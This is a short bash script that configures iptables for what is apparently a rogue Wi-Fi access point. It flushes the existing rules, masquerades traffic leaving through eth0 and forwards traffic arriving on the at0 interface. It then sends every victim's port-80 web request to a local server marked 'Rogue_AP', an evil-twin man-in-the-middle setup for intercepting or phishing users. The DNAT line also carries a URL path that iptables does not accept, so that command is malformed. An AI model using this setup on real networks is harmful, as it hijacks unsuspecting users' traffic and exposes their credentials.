#!/bin/bash
iptables --flush
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
iptables --append FORWARD --in-interface at0 -j ACCEPT 
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80/Rogue_AP/ 
iptables -t nat -A POSTROUTING -j MASQUERADE
